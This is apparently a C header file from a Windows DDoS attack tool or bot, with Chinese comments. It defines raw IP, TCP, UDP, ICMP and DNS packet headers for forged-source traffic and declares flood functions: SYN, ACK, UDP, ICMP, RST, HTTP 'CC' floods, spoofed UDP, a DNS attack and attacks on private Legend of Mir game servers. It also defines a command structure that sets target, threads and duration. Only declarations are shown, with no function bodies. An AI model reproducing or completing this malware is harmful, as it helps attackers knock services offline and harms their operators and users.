#ifndef _SEURAT_DDOS_H__
#define _SEURAT_DDOS_H__

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "stdio.h"
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include "wininet.h"
#pragma comment(lib, "Wininet.lib")
#include <stdlib.h>
#include <time.h>
#include <WS2TCPIP.H>
//#import "shdocvw.dll"
#include "atlbase.h"

#include <shlobj.h>
#include "macros.h"
/*--------------------------------------IP与封报校验------------------------------------------*/
typedef struct  _iphdr
{
	unsigned char   h_verlen; //4位手部长度，和4位IP版本号
	unsigned char   tos; //8位类型服务
	unsigned short  total_len; //16位总长度 
	unsigned short  ident; //16位标志
	unsigned short  frag_and_flags; //类型
	unsigned char   ttl; //8位生存时间 
	unsigned char   proto; //8位协议 
	unsigned short  checksum; //ip首部效验和
	unsigned int    sourceIP; //伪造IP地址或本机
	unsigned int    destIP; //攻击的ip地址 
}IP_HEADER, * PIP_HEADER;


typedef struct udp_hdr //UDP首部
{
	unsigned short sourceport; 
	unsigned short destport; 
	unsigned short udp_length; 
	unsigned short udp_checksum; 
} UDP_HEADER;

typedef struct  _tcphdr
{
	unsigned short  th_sport; //本机端口
	unsigned short  th_dport; //攻击的IP端口
	unsigned int    th_seq; //32位序列号
	unsigned int    th_ack; //32位确认号
	unsigned char   th_lenres; //4位首部长度
	unsigned char   th_flag; //6位标志位 ACK SYN and so on
	unsigned short  th_win; //16位窗口大小 
	unsigned short  th_sum; //16位效验和 
	unsigned short  th_urp; //16位紧急指针
}TCP_HEADER, * PTCP_HEADER;

typedef struct tsd_hdr
{ 
	unsigned long  saddr; //本机地址或伪造地址
	unsigned long  daddr; //目标地址
	char           mbz; 
	char           ptcl; //协议类型
	unsigned short tcpl; //TCP长度
}PSD_HEADER; 

/*-----------------------------ICMP data-----------------------------------------------*/
typedef struct _icmphdr				//定义ICMP首部
{
	BYTE   i_type;					//8位类型
	BYTE   i_code;					//8位代码
	USHORT i_cksum;					//16位校验和 
	USHORT i_id;					//识别号
	USHORT i_seq;					//报文序列号	
	ULONG  timestamp;				//时间戳
}ICMP_HEADER;

//---------------------------------传奇私服攻击--------------------------------------------
typedef struct
{
	union
	{
		DWORD dwFlag;
		struct
		{
			WORD wa;
			WORD wb;
		};
	};

	WORD wCmd;
	WORD w1;
	WORD w2;
	WORD w3;
	char data[1024];
}MMSG;

//dns
typedef struct {
	unsigned	id :16;		/*%< query identification number */
	/* fields in third byte */
	unsigned	qr: 1;		/*%< response flag */
	unsigned	opcode: 4;	/*%< purpose of message */
	unsigned	aa: 1;		/*%< authoritive answer */
	unsigned	tc: 1;		/*%< truncated message */
	unsigned	rd: 1;		/*%< recursion desired */
	/* fields in fourth byte */
	unsigned	ra: 1;		/*%< recursion available */
	unsigned	unused :1;	/*%< unused bits (MBZ as of 4.9.3a3) */
	unsigned	ad: 1;		/*%< authentic data from named */
	unsigned	cd: 1;		/*%< checking disabled by resolver */
	unsigned	rcode :4;	/*%< response code */
	
	/* remaining bytes */
	unsigned	qdcount :16;	/*%< number of question entries */
	unsigned	ancount :16;	/*%< number of answer entries */
	unsigned	nscount :16;	/*%< number of authority entries */
	unsigned	arcount :16;	/*%< number of resource entries */
} HEADER;

struct ipheader					 //ip header
{
	unsigned char ip_hl:4,ip_v:4;//首部长度和版本
	unsigned char ip_tos;        //服务类型
	unsigned short int ip_len;   //总长度
	unsigned short int ip_id;    //标识
	unsigned short int ip_off;   //片偏移
	unsigned char ip_ttl;	     //生存时间
	unsigned char ip_p;	     //协议
	unsigned short int ip_sum;   //校验和
	unsigned int ip_src;	     //ip报源地址
	unsigned int ip_dst;	    //目的地址
};
struct udpheader				 //udp header
{
	unsigned short int port_src; //源端口
	unsigned short int port_dst; //目的端口
	unsigned short int udp_len;  //udp用户数据报的长度
	unsigned short int udp_sum;  //校验和
};
struct dns_msg					//send bag
{
	ipheader ip;         //ip包头
	udpheader udp;		//udp包头
	HEADER dnshead;				//dns包头
	char dnsbuf[100];			//udp数据报
};

typedef struct _MSGHEAD
{
	DWORD dwStact;              //功能标志    0
	char  strMsg[100];          //            4
	char  dnsMsg[100];          //要查询的域名
	//	char  dnsAddr[100];         //要查询的域名
	DWORD dwPort;               //            104 
	int   nThread;              //            108
	DWORD dwTime;               //            112     
	int   nCount1;              //            116
	int   nCOunt2;              //            120 
}MSGHEAD,*PMSGHEAD;


//----------------------定义攻击函数-----------------------------------
void CC_SINCON(char ip[500],int port,int time,int xc);     //CC 无限
void LX_CC(char ip[500],int port,int time, int xc,int iext1,int iext2);      //轮询
void RST_FLOOD(char ip[500],int port,int time,int xc) ;    //HTTP Get协议	10	DK代码
void Break_CC(char ip[500],int port, int time,int xc);     //破防CC
void UDP_FLOOD(char ip[500],int port,int time,int xc) ;    //UDPFlood
void SYN_FLOOD(char ip[500],int port,int time,int xc) ;    //SYN Flood
void ICMP_FLOOD(char ip[500],int port,int time,int xc);    //ICMP流量攻击调入函数
void TCP_CONNECT(char ip[500],int port,int time,int xc);   //TCP多连接
void SF_SF(char ip[500],int port, int time,int xc) ;       //私服攻击调入函数
void ACK_FLOOD(char ip[500],int port,int time,int xc);     //ACK流量		==6		暴风7.0
void WZUDPS(char ip[500],int port, int time,int xc) ;       //伪造源UDP(流量)	UDP

void DNS_ATT(char ip[500],char dns[500],int time);

USHORT checksum(USHORT *buffer,int size);   //计算校验和
int SEU_Rand(int ran);                     //自定义的随机数发生器
int Mir2EnCode(BYTE *pInBuff,DWORD dwInLen,BYTE *pOut,DWORD dwOutLen) ; //MIR攻击数据
void   StopDDOS();                         //攻击停止函数

#endif